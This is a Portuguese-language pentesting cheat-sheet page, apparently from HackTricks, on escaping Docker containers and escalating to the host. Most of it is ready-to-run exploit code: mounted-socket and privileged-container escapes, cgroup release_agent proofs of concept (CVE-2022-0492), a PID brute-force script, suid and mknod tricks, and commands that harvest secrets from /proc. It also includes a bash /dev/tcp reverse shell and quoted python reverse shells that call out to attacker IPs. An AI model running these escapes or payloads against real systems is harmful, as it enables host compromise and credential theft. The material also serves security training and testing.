# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Enumeração Automática & Escape

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Ele também pode **enumerar contêineres**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Esta ferramenta é bastante **útil para enumerar o contêiner em que você está, até tentar escapar automaticamente**
- [**amicontained**](https://github.com/genuinetools/amicontained): Ferramenta útil para obter os privilégios que o contêiner possui a fim de encontrar maneiras de escapar dele
- [**deepce**](https://github.com/stealthcopter/deepce): Ferramenta para enumerar e escapar de contêineres
- [**grype**](https://github.com/anchore/grype): Obtenha os CVEs contidos no software instalado na imagem

## Escape do Socket Docker Montado

Se de alguma forma você descobrir que o **socket docker está montado** dentro do contêiner docker, você poderá escapar dele.\
Isso geralmente acontece em contêineres docker que, por algum motivo, precisam se conectar ao daemon docker para realizar ações.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Neste caso, você pode usar comandos docker regulares para se comunicar com o daemon do docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> Caso o **docker socket esteja em um lugar inesperado**, você ainda pode se comunicar com ele usando o comando **`docker`** com o parâmetro **`-H unix:///path/to/docker.sock`**

O daemon do Docker também pode estar [ouvindo em uma porta (por padrão 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ou em sistemas baseados em Systemd, a comunicação com o daemon do Docker pode ocorrer através do socket do Systemd `fd://`.

> [!NOTE]
> Além disso, preste atenção aos sockets de tempo de execução de outros runtimes de alto nível:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Abuso de Capacidades para Escapar

Você deve verificar as capacidades do contêiner, se ele tiver alguma das seguintes, você pode ser capaz de escapar dele: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Você pode verificar as capacidades atuais do contêiner usando **ferramentas automáticas mencionadas anteriormente** ou:
```bash
capsh --print
```
Na página a seguir, você pode **aprender mais sobre capacidades do linux** e como abusar delas para escapar/escalar privilégios:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Escape de Contêineres Privilegiados

Um contêiner privilegiado pode ser criado com a flag `--privileged` ou desabilitando defesas específicas:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

A flag `--privileged` reduz significativamente a segurança do contêiner, oferecendo **acesso irrestrito a dispositivos** e contornando **várias proteções**. Para uma análise detalhada, consulte a documentação sobre os impactos completos de `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Privilegiado + hostPID

Com essas permissões, você pode simplesmente **mover para o namespace de um processo em execução no host como root** como init (pid:1) apenas executando: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Teste em um contêiner executando:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilegiado

Apenas com a flag privilegiada você pode tentar **acessar o disco do host** ou tentar **escapar abusando de release_agent ou outras escapadas**.

Teste os seguintes bypasses em um contêiner executando:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montando Disco - Poc1

Contêineres docker bem configurados não permitirão comandos como **fdisk -l**. No entanto, em comandos docker mal configurados onde a flag `--privileged` ou `--device=/dev/sda1` com caps é especificada, é possível obter privilégios para ver o disco do host.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Portanto, para assumir o controle da máquina host, é trivial:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
E voilà! Agora você pode acessar o sistema de arquivos do host porque ele está montado na pasta `/mnt/hola`.

#### Montando Disco - Poc2

Dentro do contêiner, um atacante pode tentar obter mais acesso ao sistema operacional subjacente do host por meio de um volume hostPath gravável criado pelo cluster. Abaixo estão algumas coisas comuns que você pode verificar dentro do contêiner para ver se pode aproveitar esse vetor de ataque:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Escalada de Privilégios Abusando do release_agent existente ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Escapando de Privilégios Abusando do release_agent criado ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Encontre uma **explicação da técnica** em:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Escapando com Privilégios Abusando do release_agent sem conhecer o caminho relativo - PoC3

Nos exploits anteriores, o **caminho absoluto do contêiner dentro do sistema de arquivos do host é revelado**. No entanto, isso nem sempre é o caso. Em casos onde você **não conhece o caminho absoluto do contêiner dentro do host**, você pode usar esta técnica:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Executar o PoC dentro de um contêiner privilegiado deve fornecer uma saída semelhante a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Escapando com Privilégios Abusando de Montagens Sensíveis

Existem vários arquivos que podem ser montados que fornecem **informações sobre o host subjacente**. Alguns deles podem até indicar **algo a ser executado pelo host quando algo acontece** (o que permitirá que um atacante escape do contêiner).\
O abuso desses arquivos pode permitir que:

- release_agent (já coberto antes)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

No entanto, você pode encontrar **outros arquivos sensíveis** para verificar nesta página:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Montagens Arbitrárias

Em várias ocasiões, você encontrará que o **contêiner tem algum volume montado do host**. Se esse volume não foi configurado corretamente, você pode ser capaz de **acessar/modificar dados sensíveis**: Ler segredos, alterar ssh authorized_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Escalada de Privilégios com 2 shells e montagem de host

Se você tiver acesso como **root dentro de um contêiner** que tem alguma pasta do host montada e você **escapou como um usuário não privilegiado para o host** e tem acesso de leitura sobre a pasta montada.\
Você pode criar um **arquivo bash suid** na **pasta montada** dentro do **contêiner** e **executá-lo a partir do host** para escalar privilégios.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Escalada de Privilégios com 2 shells

Se você tiver acesso como **root dentro de um contêiner** e tiver **escapado como um usuário não privilegiado para o host**, você pode abusar de ambas as shells para **privesc dentro do host** se você tiver a capacidade MKNOD dentro do contêiner (é por padrão) como [**explicado neste post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Com tal capacidade, o usuário root dentro do contêiner é permitido **criar arquivos de dispositivo de bloco**. Arquivos de dispositivo são arquivos especiais que são usados para **acessar hardware subjacente e módulos do kernel**. Por exemplo, o arquivo de dispositivo de bloco /dev/sda dá acesso para **ler os dados brutos no disco do sistema**.

O Docker protege contra o uso indevido de dispositivos de bloco dentro de contêineres, aplicando uma política de cgroup que **bloqueia operações de leitura/gravação de dispositivos de bloco**. No entanto, se um dispositivo de bloco for **criado dentro do contêiner**, ele se torna acessível de fora do contêiner através do diretório **/proc/PID/root/**. Esse acesso requer que o **proprietário do processo seja o mesmo** tanto dentro quanto fora do contêiner.

Exemplo de **exploração** deste [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Se você puder acessar os processos do host, conseguirá acessar muitas informações sensíveis armazenadas nesses processos. Execute o laboratório de testes:
```
docker run --rm -it --pid=host ubuntu bash
```
Por exemplo, você poderá listar os processos usando algo como `ps auxn` e procurar por detalhes sensíveis nos comandos.

Então, como você pode **acessar cada processo do host em /proc/ você pode simplesmente roubar seus segredos de ambiente** executando:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Você também pode **acessar os descritores de arquivo de outros processos e ler seus arquivos abertos**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Você também pode **matar processos e causar um DoS**.

> [!WARNING]
> Se você de alguma forma tiver **acesso privilegiado a um processo fora do contêiner**, você poderia executar algo como `nsenter --target <pid> --all` ou `nsenter --target <pid> --mount --net --pid --cgroup` para **executar um shell com as mesmas restrições de ns** (esperançosamente nenhuma) **que esse processo.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Se um contêiner foi configurado com o Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), a pilha de rede desse contêiner não está isolada do host Docker (o contêiner compartilha o namespace de rede do host) e o contêiner não recebe seu próprio endereço IP alocado. Em outras palavras, o **contêiner vincula todos os serviços diretamente ao IP do host**. Além disso, o contêiner pode **interceptar TODO o tráfego de rede que o host** está enviando e recebendo na interface compartilhada `tcpdump -i eth0`.

Por exemplo, você pode usar isso para **capturar e até mesmo falsificar tráfego** entre o host e a instância de metadados.

Como nos seguintes exemplos:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Você também poderá acessar **serviços de rede vinculados ao localhost** dentro do host ou até mesmo acessar as **permissões de metadados do nó** (que podem ser diferentes daquelas que um contêiner pode acessar).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Com `hostIPC=true`, você ganha acesso aos recursos de comunicação entre processos (IPC) do host, como **memória compartilhada** em `/dev/shm`. Isso permite leitura/escrita onde os mesmos recursos IPC são usados por outros processos do host ou do pod. Use `ipcs` para inspecionar esses mecanismos IPC mais a fundo.

- **Inspecionar /dev/shm** - Procure por quaisquer arquivos nesta localização de memória compartilhada: `ls -la /dev/shm`
- **Inspecionar instalações IPC existentes** – Você pode verificar se alguma instalação IPC está sendo usada com `/usr/bin/ipcs`. Verifique com: `ipcs -a`

### Recuperar capacidades

Se a syscall **`unshare`** não estiver proibida, você pode recuperar todas as capacidades executando:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Abuso de namespace de usuário via symlink

A segunda técnica explicada no post [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica como você pode abusar de montagens bind com namespaces de usuário, para afetar arquivos dentro do host (neste caso específico, deletar arquivos).

## CVEs

### Exploit Runc (CVE-2019-5736)

Caso você consiga executar `docker exec` como root (provavelmente com sudo), você tenta escalar privilégios escapando de um contêiner abusando do CVE-2019-5736 (exploit [aqui](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Esta técnica basicamente **sobrescreverá** o _**/bin/sh**_ binário do **host** **a partir de um contêiner**, então qualquer um executando docker exec pode acionar o payload.

Altere o payload conforme necessário e construa o main.go com `go build main.go`. O binário resultante deve ser colocado no contêiner docker para execução.\
Ao executar, assim que exibir `[+] Overwritten /bin/sh successfully`, você precisa executar o seguinte a partir da máquina host:

`docker exec -it <container-name> /bin/sh`

Isso acionará o payload que está presente no arquivo main.go.

Para mais informações: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Existem outros CVEs aos quais o contêiner pode ser vulnerável, você pode encontrar uma lista em [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Escape Personalizado do Docker

### Superfície de Escape do Docker

- **Namespaces:** O processo deve ser **completamente separado de outros processos** via namespaces, então não podemos escapar interagindo com outros procs devido a namespaces (por padrão não podem se comunicar via IPCs, sockets unix, serviços de rede, D-Bus, `/proc` de outros procs).
- **Usuário root**: Por padrão, o usuário que executa o processo é o usuário root (no entanto, seus privilégios são limitados).
- **Capacidades**: O Docker deixa as seguintes capacidades: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: Estas são as syscalls que o **usuário root não poderá chamar** (devido à falta de capacidades + Seccomp). As outras syscalls poderiam ser usadas para tentar escapar.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="syscalls arm64"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
